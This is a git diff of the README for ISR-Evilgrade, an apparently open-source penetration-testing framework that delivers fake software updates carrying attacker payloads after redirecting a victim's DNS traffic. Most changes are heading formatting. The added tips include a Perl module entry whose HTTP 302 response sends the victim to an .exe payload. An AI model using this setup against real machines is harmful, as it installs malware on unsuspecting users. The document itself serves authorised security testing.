@@ -12,11 +12,11 @@ Evilgrade is a modular framework that allows the user to take advantage of poor 
 It comes with pre-made binaries (agents), a working default configuration for fast pentests, and has it's own WebServer and DNSServer modules.
 Easy to set up new settings, and has an autoconfiguration when new binary agents are set.
 
-* When should I use evilgrade?
+##### * When should I use evilgrade?
 
 This framework comes into play when the attacker is able to make hostname redirections (manipulation of victim's dns traffic), and such thing can be done on 2 scenarios:
 
-Internal scenery:
+##### Internal scenery:
 - Internal DNS access
 - ARP spoofing
 - DNS Cache Poisoning
@@ -24,19 +24,19 @@ Internal scenery:
 - TCP hijacking
 - Wi-Fi Access Point impersonation
 
-External scenery:
+##### External scenery:
 - Internal DNS access
 - DNS Cache Poisoning
 
-* How does it work?
+##### * How does it work?
 
 Evilgrade works with modules, in each module there's an implemented structure which is needed to emulate a fake update for an specific application/system.
 
-* What OS are supported?
+##### * What OS are supported?
 
 ISR-Evilgrade is crossplatform, it only depends of having an appropriate payload for the right target platform to be exploited.
 
-Implemented modules:
+#### Implemented modules:
 -------------------
 - Freerip 3.30
 - Jet photo 4.7.2
@@ -422,7 +422,7 @@ help      - prints this screen, or help on 'command'
 
 ```
 
-.:: [ADVANCED] ::.
+## .:: [ADVANCED] ::.
 
 - Modules Options:
 Each module has special options, but the "agent" field is always present.
@@ -473,7 +473,7 @@ After our payload was generated, we leave a multi handler listening on the previ
 [*] Starting the payload handler...
 ```
 
-.:: [MODULE DEVELOPMENT] ::.
+## .:: [MODULE DEVELOPMENT] ::.
 
 Module development is very simple. Since evilgrade is based on modules, you just have to use a package .pm (perl module).
 In this case we are going to describe the sunjava update module (comments with #):
@@ -590,17 +590,40 @@ my $base=
 };
 ```
 
-.:: [TIPS] ::.
+## .:: [TIPS] ::.
 
 1) Don't forget to run evilgrade with an user that has privileges to create listening sockets,
 otherwise you won't be able to use evilgrade's Services.
+
 2) Everytime you modify a module with evilgrade running don't forget to 'reload' them.
+
 3) Set the binary 'agents' before starting services because there are some fields that evilgrade
 will fill out for you (agentmd5, agentsha256, and agentsize) that can't be done with them already running.
 
-.:: [REQUIREMENTS] ::.
+4) If you're using a dynamic response with variables such as: <%AGENTSIZE%>, <%AGENTMD5%>, <%URL\_FILE%>, <%URL\_FILE\_EXT%>, or custom ones defined at the options section, don't forget to set *parse* on 1.
 
-# Perl Modules
+5) Same goes for injecting an agent, you must enable de *bin* flag on 1.
+
+6) If you want to make plaintext responses using HTTP use the *cheader* flag. Example below:
+```
+        {   'req' => '/sitepath/download/file.zip'
+            ,    #regex friendly
+            'type'    => 'string',                  #file|string|agent|install
+            'method'  => '',                        #any
+            'bin'     => '',
+            'string'  => '',
+            'parse'   => '1',
+            'file'    => '',
+            'cheader' => "HTTP/1.1 302 Found\r\n"
+                . "Location: http://sitedomain.com/<%URL_FILE%>.exe \r\n"
+                . "Content-Length: 0 \r\n"
+                . "Connection: close \r\n\r\n",
+        },
+```
+
+## .:: [REQUIREMENTS] ::.
+
+### Perl Modules
 ```
     Data::Dump
     Digest::MD5
@@ -608,7 +631,7 @@ will fill out for you (agentmd5, agentsha256, and agentsize) that can't be done 
     RPC::XML
 ```
 
-.:: [MORE INFORMATION] ::.
+## .:: [MORE INFORMATION] ::.
 
 This framework was presented in the following security conferences:
 
@@ -621,7 +644,7 @@ This framework was presented in the following security conferences:
 ```
 
 
-.:: [AUTHOR] ::.
+## .:: [AUTHOR] ::.
 
 Francisco Amato
 famato+at+infobytesec+dot+com
